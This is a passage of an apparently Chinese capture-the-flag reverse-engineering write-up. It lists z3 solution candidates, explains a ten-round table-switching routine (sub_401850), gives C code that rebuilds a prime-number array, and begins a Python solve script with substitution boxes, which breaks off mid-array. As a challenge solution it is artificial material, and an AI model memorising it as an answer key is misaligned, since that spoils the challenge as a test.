class="number">124</span>,x[<span class="number">10</span>] = <span class="number">170</span>,x[<span class="number">15</span>] = <span class="number">51</span>,x[<span class="number">0</span>] = <span class="number">58</span>] </span><br><span class="line"></span><br><span class="line">[<span class="number">2</span>]                                                                                     </span><br><span class="line">[x[<span class="number">9</span>] = <span class="number">58</span>,x[<span class="number">14</span>] = <span class="number">145</span>,x[<span class="number">8</span>] = <span class="number">153</span>,x[<span class="number">2</span>] = <span class="number">179</span>,x[<span class="number">7</span>] = <span class="number">58</span>,x[<span class="number">12</span>] = <span class="number">75</span>,x[<span class="number">1</span>] = <span class="number">42</span>,x[<span class="number">5</span>] = <span class="number">115</span>,x[<span class="number">4</span>] = <span class="number">199</span>,x[<span class="number">11</span>] = <span class="number">50</span>,x[<span class="number">6</span>] = <span class="number">106</span>,x[<span class="number">3</span>] = <span class="number">45</span>,x[<span class="number">13</span>] = <span class="number">188</span>,x[<span class="number">10</span>] = <span class="number">42</span>,x[<span class="number">15</span>] = <span class="number">115</span>,x[<span class="number">0</span>] = <span class="number">186</span>]</span><br><span class="line"></span><br><span class="line">[<span class="number">3</span>]</span><br><span class="line">[x[<span class="number">9</span>] = <span class="number">58</span>,x[<span class="number">14</span>] = <span class="number">17</span>,x[<span class="number">8</span>] = <span class="number">153</span>,x[<span class="number">2</span>] = <span class="number">51</span>,x[<span class="number">7</span>] = <span class="number">186</span>,x[<span class="number">12</span>] = <span class="number">203</span>,x[<span class="number">1</span>] = <span class="number">170</span>,x[<span class="number">5</span>] = <span class="number">243</span>,x[<span class="number">4</span>] = <span class="number">71</span>,x[<span class="number">11</span>] = <span class="number">178</span>,x[<span class="number">6</span>] = <span class="number">234</span>,x[<span class="number">3</span>] = <span class="number">45</span>,x[<span class="number">13</span>] = <span class="number">60</span>,x[<span class="number">10</span>] = <span class="number">170</span>,x[<span class="number">15</span>] = <span class="number">243</span>,x[<span class="number">0</span>] = <span class="number">58</span>]</span><br><span class="line"></span><br><span class="line">[<span class="number">4</span>]                                                                                     </span><br><span class="line">[x[<span class="number">9</span>] = <span class="number">58</span>,x[<span class="number">14</span>] = <span class="number">17</span>,x[<span class="number">8</span>] = <span class="number">153</span>,x[<span class="number">2</span>] = <span class="number">179</span>,x[<span class="number">7</span>] = <span class="number">58</span>,x[<span class="number">12</span>] = <span class="number">203</span>,x[<span class="number">1</span>] = <span class="number">42</span>,x[<span class="number">5</span>] = <span class="number">243</span>,x[<span class="number">4</span>] = <span class="number">199</span>,x[<span class="number">11</span>] = <span class="number">178</span>,x[<span class="number">6</span>] = <span class="number">234</span>,x[<span class="number">3</span>] = <span class="number">45</span>,x[<span class="number">13</span>] = <span class="number">60</span>,x[<span class="number">10</span>] = <span class="number">42</span>,x[<span class="number">15</span>] = <span class="number">243</span>,x[<span class="number">0</span>] = <span class="number">186</span>]</span><br><span class="line"></span><br><span class="line">[<span class="number">5</span>]                                                                                       [x[<span class="number">9</span>] = <span class="number">186</span>,x[<span class="number">14</span>] = <span class="number">81</span>,x[<span class="number">8</span>] = <span class="number">25</span>,x[<span class="number">2</span>] = <span class="number">179</span>,x[<span class="number">7</span>] = <span class="number">58</span>,x[<span class="number">12</span>] = <span class="number">139</span>,x[<span class="number">1</span>] = <span class="number">170</span>,x[<span class="number">5</span>] = <span class="number">179</span>,x[<span class="number">4</span>] = <span class="number">199</span>,x[<span class="number">11</span>] = <span class="number">242</span>,x[<span class="number">6</span>] = <span class="number">170</span>,x[<span class="number">3</span>] = <span class="number">45</span>,x[<span class="number">13</span>] = <span class="number">252</span>,x[<span class="number">10</span>] = <span class="number">170</span>,x[<span class="number">15</span>] = <span class="number">179</span>,x[<span class="number">0</span>] = <span class="number">5</span></span><br><span class="line"></span><br><span class="line">[<span class="number">6</span>]                                                                                       [x[<span class="number">9</span>] = <span class="number">186</span>,x[<span class="number">14</span>] = <span class="number">81</span>,x[<span class="number">8</span>] = <span class="number">25</span>,x[<span class="number">2</span>] = <span class="number">51</span>,x[<span class="number">7</span>] = <span class="number">186</span>,x[<span class="number">12</span>] = <span class="number">139</span>,x[<span class="number">1</span>] = <span class="number">42</span>,x[<span class="number">5</span>] = <span class="number">179</span>,x[<span class="number">4</span>] = <span class="number">71</span>,x[<span class="number">11</span>] = <span class="number">242</span>,x[<span class="number">6</span>] = <span class="number">170</span>,x[<span class="number">3</span>] = <span class="number">45</span>,x[<span class="number">13</span>] = <span class="number">252</span>,x[<span class="number">10</span>] = <span class="number">42</span>,x[<span class="number">15</span>] = <span class="number">179</span>,x[<span class="number">0</span>] = <span class="number">186</span>]</span><br><span class="line"></span><br><span class="line">[<span class="number">7</span>]                                                                                       [x[<span class="number">9</span>] = <span class="number">186</span>,x[<span class="number">14</span>] = <span class="number">209</span>,x[<span class="number">8</span>] = <span class="number">25</span>,x[<span class="number">2</span>] = <span class="number">51</span>,x[<span class="number">7</span>] = <span class="number">186</span>,x[<span class="number">12</span>] = <span class="number">11</span>,x[<span class="number">1</span>] = <span class="number">42</span>,x[<span class="number">5</span>] = <span class="number">51</span>,x[<span class="number">4</span>] = <span class="number">71</span>,x[<span class="number">11</span>] = <span class="number">114</span>,x[<span class="number">6</span>] = <span class="number">42</span>,x[<span class="number">3</span>] = <span class="number">45</span>,x[<span class="number">13</span>] = <span class="number">124</span>,x[<span class="number">10</span>] = <span class="number">42</span>,x[<span class="number">15</span>] = <span class="number">51</span>,x[<span class="number">0</span>] = <span class="number">186</span>]   </span><br></pre></td></tr></table></div></figure><p>最后是<code>sub_401850</code></p><p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202301132212297.png" alt="image-20221127212926335"></p><p>将输入<code>a1</code>，及其长度<code>a2</code>输入到函数里面</p><p>首先跳转到一张索引表</p><p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202301132212291.png" alt="image-20221127213140494"></p><p>每个索引表都对应一个映射函数</p><p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202301132212545.png" alt="image-20221127213239440">、</p><p>这个换表的过程重复10次</p><p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202301132212878.png" alt="image-20221127213445721"></p><p>根据v4的值换表，首先把v4的值求出来，得出换表的顺序，然后再把z3求出来的解一个一个丢进去试</p><figure class="highlight c++"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdint&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">char</span> __cdecl <span class="title">sub_401780</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> i; <span class="comment">// [esp+0h] [ebp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">2</span>; i &lt;= a1 &gt;&gt; <span class="number">1</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( !(a1 % i) )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> a1[<span class="number">10</span>];</span><br><span class="line">    <span class="type">int</span> i, v3, result;</span><br><span class="line">   *a1 = <span class="number">2</span>;</span><br><span class="line">  a1[<span class="number">1</span>] = <span class="number">3</span>;</span><br><span class="line">  result = <span class="number">2</span>;</span><br><span class="line">  v3 = <span class="number">2</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">4</span>; i &lt;= <span class="number">30</span> &amp;&amp; v3 &lt; <span class="number">10</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    result = <span class="built_in">sub_401780</span>(i);</span><br><span class="line">    <span class="keyword">if</span> ( result )</span><br><span class="line">    &#123;</span><br><span class="line">      a1[v3] = i;</span><br><span class="line">      result = ++v3;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d, &quot;</span>, a1[i]);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></div></figure><figure class="highlight c++"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> a1[] = &#123;<span class="number">2</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">7</span>, <span class="number">11</span>, <span class="number">13</span>, <span class="number">17</span>, <span class="number">19</span>, <span class="number">23</span>, <span class="number">29</span>&#125;;</span><br></pre></td></tr></table></div></figure><p>脚本</p><figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br></pre></td><td class="code"><pre><span class="line">box2 = [<span class="number">0x7A</span>, <span class="number">0x91</span>, <span class="number">0x9F</span>, <span class="number">0x23</span>, <span class="number">0x71</span>, <span class="number">0xD1</span>, <span class="number">0x63</span>, <span class="number">0xDB</span>, <span class="number">0x59</span>, <span class="number">0x0A</span>, <span class="number">0xEC</span>, <span class="number">0x69</span>, <span class="number">0xEE</span>, <span class="number">0x76</span>, <span class="number">0x5D</span>, <span class="number">0x64</span>, <span class="number">0x37</span>, <span class="number">0x42</span>,</span><br><span class="line">        <span class="number">0x8C</span>, <span class="number">0x0B</span>, <span class="number">0x3C</span>, <span class="number">0x5C</span>, <span class="number">0x80</span>, <span class="number">0xAD</span>, <span class="number">0x6A</span>, <span class="number">0x03</span>, <span class="number">0x43</span>, <span class="number">0x93</span>, <span class="number">0xBC</span>, <span class="number">0xBF</span>, <span class="number">0xE3</span>, <span class="number">0xAF</span>, <span class="number">0x5A</span>, <span class="number">0x8A</span>, <span class="number">0x65</span>, <span class="number">0x0D</span>,</span><br><span class="line">        <span class="number">0x31</span>, <span class="number">0xDF</span>, <span class="number">0x3E</span>, <span class="number">0xA7</span>, <span class="number">0xE4</span>, <span class="number">0xDD</span>, <span class="number">0xB4</span>, <span class="number">0xB0</span>, <span class="number">0x56</span>, <span class="number">0x1C</span>, <span class="number">0x12</span>, <span class="number">0xA4</span>, <span class="number">0x9E</span>, <span class="number">0xD8</span>, <span class="number">0x3D</span>, <span class="number">0x81</span>, <span class="number">0x60</span>, <span class="number">0x9A</span>,</span><br><span class="line">        <span class="number">0xCB</span>, <span class="number">0xFA</span>, <span class="number">0xB1</span>, <span class="number">0xE0</span>, <span class="number">0xD3</span>, <span class="number">0xF4</span>, <span class="number">0xA2</span>, <span class="number">0x26</span>, <span class="number">0x68</span>, <span class="number">0x90</span>, <span class="number">0x4B</span>, <span class="number">0x45</span>, <span class="number">0x85</span>, <span class="number">0x20</span>, <span class="number">0x16</span>, <span class="number">0xDE</span>, <span class="number">0xED</span>, <span class="number">0x4C</span>,</span><br><span class="line">        <span class="number">0x6F</span>, <span class="number">0x34</span>, <span class="number">0xDC</span>, <span class="number">0xBE</span>, <span class="number">0xD2</span>, <span class="number">0x46</span>, <span class="number">0x33</span>, <span class="number">0x14</span>, <span class="number">0x77</span>, <span class="number">0xC6</span>, <span class="number">0xCD</span>, <span class="number">0xF0</span>, <span class="number">0xC5</span>, <span class="number">0xAC</span>, <span class="number">0x1F</span>, <span class="number">0xD0</span>, <span class="number">0x95</span>, <span class="number">0x97</span>,</span><br><span class="line">        <span class="number">0x3F</span>, <span class="number">0xD7</span>, <span class="number">0x52</span>, <span class="number">0xAE</span>, <span class="number">0xB9</span>, <span class="number">0xC9</span>, <span class="number">0x0C</span>, <span class="number">0xCA</span>, <span class="number">0x4E</span>, <span class="number">0xF1</span>, <span class="number">0xB7</span>, <span class="number">0x39</span>, <span class="number">0x7F</span>, <span class="number">0x27</span>, <span class="number">0x2B</span>, <span class="number">0x40</span>, <span class="number">0x4A</span>, <span class="number">0x51</span>,</span><br><span class="line">        <span class="number">0xA1</span>, <span class="number">0xCC</span>, <span class="number">0xCE</span>, <span class="number">0x6E</span>, <span class="number">0x70</span>, <span class="number">0xFF</span>, <span class="number">0x0E</span>, <span class="number">0xEF</span>, <span class="number">0x8E</span>, <span class="number">0x25</span>, <span class="number">0xB3</span>, <span class="number">0x5E</span>, <span class="number">0x6C</span>, <span class="number">0xAB</span>, <span class="number">0x02</span>, <span class="number">0x49</span>, <span class="number">0xE9</span>, <span class="number">0x9B</span>,</span><br><span class="line">        <span class="number">0x36</span>, <span class="number">0x13</span>, <span class="number">0x9C</span>, <span class="number">0x04</span>, <span class="number">0x35</span>, <span class="number">0xC0</span>, <span class="number">0xFB</span>, <span class="number">0x3A</span>, <span class="number">0x67</span>, <span class="number">0xB6</span>, <span class="number">0x9D</span>, <span class="number">0xC2</span>, <span class="number">0x73</span>, <span class="number">0xB5</span>, <span class="number">0x6D</span>, <span class="number">0xCF</span>, <span class="number">0x83</span>, <span class="number">0x2C</span>,</span><br><span class="line">        <span class="number">0x01</span>, <span class="number">0xC1</span>, <span class="number">0x10</span>, <span class="number">0x6B</span>, <span class="number">0x79</span>, <span class="number">0x87</span>, <span class="number">0x5B</span>, <span class="number">0x57</span>, <span class="number">0x47</span>, <span class="number">0xE5</span>, <span class="number">0x15</span>, <span class="number">0xF7</span>, <span class="number">0xA5</span>, <span class="number">0x74</span>, <span class="number">0xAA</span>, <span class="number">0x53</span>, <span class="number">0x7D</span>, <span class="number">0x2E</span>,</span><br><span class="line">        <span class="number">0xD5</span>, <span class="number">0xA3</span>, <span class="number">0x19</span>, <span class="number">0xF5</span>, <span class="number">0x2D</span>, <span class="number">0xFD</span>, <span class="number">0x61</span>, <span class="number">0x8D</span>, <span class="number">0xC8</span>, <span class="number">0x1B</span>, <span class="number">0xC3</span>, <span class="number">0xDA</span>, <span class="number">0xF6</span>, <span class="number">0x72</span>, <span class="number">0x54</span>, <span class="number">0x5F</span>, <span class="number">0x1E</span>, <span class="number">0xE8</span>,</span><br><span class="line">        <span class="number">0x17</span>, <span class="number">0x50</span>, <span class="number">0xB2</span>, <span class="number">0xE7</span>, <span class="number">0x0F</span>, <span class="number">0x7E</span>, <span class="number">0x55</span>, <span class="number">0xBD</span>, <span class="number">0x86</span>, <span class="number">0x00</span>, <span class="number">0x78</span>, <span class="number">0x94</span>, <span class="number">0x92</span>, <span class="number">0x09</span>, <span class="number">0x2F</span>, <span class="number">0xD6</span>, <span class="number">0xD9</span>, <span class="number">0xF3</span>,</span><br><span class="line">        <span class="number">0x29</span>, <span class="number">0xE6</span>, <span class="number">0x24</span>, <span class="number">0x32</span>, <span class="number">0x66</span>, <span class="number">0x22</span>, <span class="number">0x41</span>, <span class="number">0xC4</span>, <span class="number">0x7C</span>, <span class="number">0x05</span>, <span class="number">0x98</span>, <span class="number">0x44</span>, <span class="number">0x4F</span>, <span class="number">0x99</span>, <span class="number">0xA9</span>, <span class="number">0xE1</span>, <span class="number">0x8F</span>, <span class="number">0x08</span>,</span><br><span class="line">        <span class="number">0x1A</span>, <span class="number">0x2A</span>, <span class="number">0x11</span>, <span class="number">0xEA</span>, <span class="number">0x3B</span>, <span class="number">0xE2</span>, <span class="number">0x38</span>, <span class="number">0xB8</span>, <span class="number">0x18</span>, <span class="number">0xF9</span>, <span class="number">0xD4</span>, <span class="number">0xC7</span>, <span class="number">0x62</span>, <span class="number">0x7B</span>, <span class="number">0x75</span>, <span class="number">0x58</span>, <span class="number">0x96</span>, <span class="number">0x28</span>,</span><br><span class="line">        <span class="number">0xEB</span>, <span class="number">0x06</span>, <span class="number">0x84</span>, <span class="number">0x89</span>, <span class="number">0x48</span>, <span class="number">0x82</span>, <span class="number">0x88</span>, <span class="number">0xA6</span>, <span class="number">0xFE</span>, <span class="number">0xA0</span>, <span class="number">0xF2</span>, <span class="number">0xF8</span>, <span class="number">0x1D</span>, <span class="number">0x8B</span>, <span class="number">0xFC</span>, <span class="number">0xA8</span>, <span class="number">0x21</span>, <span class="number">0x30</span>,</span><br><span class="line">        <span class="number">0xBB</span>, <span class="number">0x07</span>, <span class="number">0xBA</span>, <span class="number">0x4D</span>]</span><br><span class="line">box3 = [<span class="number">0x45</span>, <span class="number">0x1F</span>, <span class="number">0x63</span>, <span class="number">0x81</span>, <span class="number">0xE6</span>, <span class="number">0xAD</span>, <span class="number">0x4F</span>, <span class="number">0xD3</span>, <span class="number">0xC0</span>, <span class="number">0x15</span>, <span class="number">0x69</span>, <span class="number">0x8F</span>, <span class="number">0x0D</span>, <span class="number">0x31</span>, <span class="number">0x0C</span>, <span class="number">0xB0</span>, <span class="number">0xF1</span>, <span class="number">0x2E</span>,</span><br><span class="line">        <span class="number">0x98</span>, <span class="number">0xC1</span>, <span class="number">0xC2</span>, <span class="number">0x96</span>, <span class="number">0xB2</span>, <span class="number">0xEB</span>, <span class="number">0xBF</span>, <span class="number">0xDF</span>, <span class="number">0x17</span>, <span class="number">0xF4</span>, <span class="number">0x7F</span>, <span class="number">0xE5</span>, <span class="number">0x66</span>, <span class="number">0x73</span>, <span class="number">0xD8</span>, <span class="number">0x56</span>, <span class="number">0x46</span>, <span class="number">0x20</span>,</span><br><span class="line">        <span class="number">0x9C</span>, <span class="number">0x77</span>, <span class="number">0x3D</span>, <span class="number">0x72</span>, <span class="number">0xA3</span>, <span class="number">0x91</span>, <span class="number">0x49</span>, <span class="number">0x68</span>, <span class="number">0x4C</span>, <span class="number">0x1E</span>, <span class="number">0xAE</span>, <span class="number">0x06</span>, <span class="number">0x7A</span>, <span class="number">0x94</span>, <span class="number">0xDD</span>, <span class="number">0x52</span>, <span class="number">0x55</span>, <span class="number">0x2C</span>,</span><br><span class="line">        <span class="number">0xB8</span>, <span class="number">0x42</span>, <span class="number">0x79</span>, <span class="number">0xFE</span>, <span class="number">0x38</span>, <span class="number">0xEF</span>, <span class="number">0x8B</span>, <span class="number">0xF7</span>, <span class="number">0xAC</span>, <span class="number">0xDC</span>, <span class="number">0xFF</span>, <span class="number">0x78</span>, <span class="number">0x34</span>, <span class="number">0x70</span>, <span class="number">0xA9</span>, <span class="number">0xCE</span>, <span class="number">0x3F</span>, <span class="number">0x0E</span>,</span><br><span class="line">        <span class="number">0x11</span>, <span class="number">0x43</span>, <span class="number">0x5B</span>, <span class="number">0xF8</span>, <span class="number">0xAF</span>, <span class="number">0xD0</span>, <span class="number">0xFA</span>, <span class="number">0x33</span>, <span class="number">0xBA</span>, <span class="number">0xCF</span>, <span class="number">0x4A</span>, <span class="number">0xC9</span>, <span class="number">0x88</span>, <span class="number">0x4E</span>, <span class="number">0x80</span>, <span class="number">0x10</span>, <span class="number">0x85</span>, <span class="number">0x37</span>,</span><br><span class="line">        <span class="number">0x12</span>, <span class="number">0xAB</span>, <span class="number">0xE1</span>, <span class="number">0x61</span>, <span class="number">0xB7</span>, <span class="number">0x3E</span>, <span class="number">0x4D</span>, <span class="number">0x19</span>, <span class="number">0x3A</span>, <span class="number">0x04</span>, <span class="number">0x8C</span>, <span class="number">0x92</span>, <span class="number">0x0B</span>, <span class="number">0xE7</span>, <span class="number">0x3C</span>, <span class="number">0xEA</span>, <span class="number">0xC7</span>, <span class="number">0x16</span>,</span><br><span class="line">        <span class="number">0x35</span>, <span class="number">0xB1</span>, <span class="number">0xA7</span>, <span class="number">0x8E</span>, <span class="number">0x40</span>, <span class="number">0x9F</span>, <span class="number">0xB6</span>, <span class="number">0xB5</span>, <span class="number">0x25</span>, <span class="number">0xA0</span>, <span class="number">0x5A</span>, <span class="number">0x30</span>, <span class="number">0x7D</span>, <span class="number">0xA2</span>, <span class="number">0x1A</span>, <span class="number">0x64</span>, <span class="number">0xC5</span>, <span class="number">0x6D</span>,</span><br><span class="line">        <span class="number">0x74</span>, <span class="number">0x82</span>, <span class="number">0x08</span>, <span class="number">0x7E</span>, <span class="number">0xD2</span>, <span class="number">0xF6</span>, <span class="number">0xAA</span>, <span class="number">0xDA</span>, <span class="number">0xED</span>, <span class="number">0x4B</span>, <span class="number">0x6E</span>, <span class="number">0xE8</span>, <span class="number">0xE9</span>, <span class="number">0xE2</span>, <span class="number">0xD4</span>, <span class="number">0x71</span>, <span class="number">0xB9</span>, <span class="number">0x09</span>,</span><br><span class="line">        <span class="number">0x84</span>, <span class="number">0x3B</span>, <span class="number">0xC4</span>, <span class="number">0x1C</span>, <span class="number">0x60</span>, <span class="number">0xFD</span>, <span class="number">0x22</span>, <span class="number">0x99</span>, <span class="number">0x39</span>, <span class="number">0x97</span>, <span class="number">0x18</span>, <span class="number">0x89</span>, <span class="number">0x7C</span>, <span class="number">0xA4</span>, <span class="number">0x27</span>, <span class="number">0xBD</span>, <span class="number">0x0F</span>, <span class="number">0xCC</span>,</span><br><span class="line">        <span class="number">0x95</span>, <span class="number">0xF5</span>, <span class="number">0xB3</span>, <span class="number">0x65</span>, <span class="number">0x6B</span>, <span class="number">0x8A</span>, <span class="number">0x58</span>, <span class="number">0x36</span>, <span class="number">0xBB</span>, <span class="number">0x9E</span>, <span class="number">0x75</span>, <span class="number">0xD1</span>, <span class="number">0x03</span>, <span class="number">0x9D</span>, <span class="number">0x6A</span>, <span class="number">0x6C</span>, <span class="number">0x53</span>, <span class="number">0x05</span>,</span><br><span class="line">        <span class="number">0xB4</span>, <span class="number">0xE4</span>, <span class="number">0xEE</span>, <span class="number">0x67</span>, <span class="number">0x87</span>, <span class="number">0x7B</span>, <span class="number">0x32</span>, <span class="number">0x2D</span>, <span class="number">0x24</span>, <span class="number">0x2A</span>, <span class="number">0x59</span>, <span class="number">0xEC</span>, <span class="number">0x0A</span>, <span class="number">0xDB</span>, <span class="number">0x21</span>, <span class="number">0x07</span>, <span class="number">0x23</span>, <span class="number">0x50</span>,</span><br><span class="line">        <span class="number">0x02</span>, <span class="number">0x41</span>, <span class="number">0xF2</span>, <span class="number">0x83</span>, <span class="number">0xD9</span>, <span class="number">0x26</span>, <span class="number">0xBC</span>, <span class="number">0x6F</span>, <span class="number">0x86</span>, <span class="number">0xA6</span>, <span class="number">0x93</span>, <span class="number">0xF9</span>, <span class="number">0xC8</span>, <span class="number">0xD6</span>, <span class="number">0xA5</span>, <span class="number">0x1D</span>, <span class="number">0xE3</span>, <span class="number">0xE0</span>,</span><br><span class="line">        <span class="number">0xFC</span>, <span class="number">0xCA</span>, <span class="number">0x1B</span>, <span class="number">0x5E</span>, <span class="number">0x8D</span>, <span class="number">0x2F</span>, <span class="number">0x5C</span>, <span class="number">0xBE</span>, <span class="number">0x47</span>, <span class="number">0xA8</span>, <span class="number">0x44</span>, <span class="number">0x57</span>, <span class="number">0x54</span>, <span class="number">0x48</span>, <span class="number">0xC3</span>, <span class="number">0x00</span>, <span class="number">0x62</span>, <span class="number">0x5D</span>,</span><br><span class="line">        <span class="number">0xCB</span>, <span class="number">0xD7</span>, <span class="number">0x76</span>, <span class="number">0xCD</span>, <span class="number">0x28</span>, <span class="number">0xD5</span>, <span class="number">0x14</span>, <span class="number">0x90</span>, <span class="number">0x13</span>, <span class="number">0xDE</span>, <span class="number">0x5F</span>, <span class="number">0xF0</span>, <span class="number">0x01</span>, <span class="number">0x2B</span>, <span class="number">0xC6</span>, <span class="number">0x29</span>, <span class="number">0x9A</span>, <span class="number">0x9B</span>,</span><br><span class="line">        <span class="number">0x51</span>, <span class="number">0xF3</span>, <span class="number">0xFB</span>, <span class="number">0xA1</span>]</span><br><span class="line">box5 = [<span class="number">0x00</span>, <span class="number">0x74</span>, <span class="number">0x59</span>, <span class="number">0xC6</span>, <span class="number">0xAC</span>, <span class="number">0xD3</span>, <span class="number">0xC1</span>, <span class="number">0xA0</span>, <span class="number">0x88</span>, <span class="number">0x3F</span>, <span class="number">0x1C</span>, <span class="number">0x28</span>, <span class="number">0x17</span>, <span class="number">0x22</span>, <span class="number">0xC5</span>, <span class="number">0x38</span>, <span class="number">0xF9</span>, <span class="number">0x1B</span>,</span><br><span class="line">        <span class="number">0x21</span>, <span class="number">0x49</span>, <span class="number">0x99</span>, <span class="number">0xAF</span>, <span class="number">0xD6</span>, <span class="number">0x95</span>, <span class="number">0xA4</span>, <span class="number">0x9D</span>, <span class="number">0x5D</span>, <span class="number">0x5B</span>, <span class="number">0x73</span>, <span class="number">0xFE</span>, <span class="number">0xC9</span>, <span class="number">0x9A</span>, <span class="number">0x4C</span>, <span class="number">0xB4</span>, <span class="number">0x27</span>, <span class="number">0x5E</span>,</span><br><span class="line">        <span class="number">0x71</span>, <span class="number">0x25</span>, <span class="number">0xE2</span>, <span class="number">0x90</span>, <span class="number">0xC0</span>, <span class="number">0x62</span>, <span class="number">0x5F</span>, <span class="number">0x48</span>, <span class="number">0x77</span>, <span class="number">0xE0</span>, <span class="number">0xF2</span>, <span class="number">0x8E</span>, <span class="number">0x40</span>, <span class="number">0xC7</span>, <span class="number">0x79</span>, <span class="number">0x1A</span>, <span class="number">0xDC</span>, <span class="number">0xF3</span>,</span><br><span class="line">        <span class="number">0x01</span>, <span class="number">0xB6</span>, <span class="number">0xD8</span>, <span 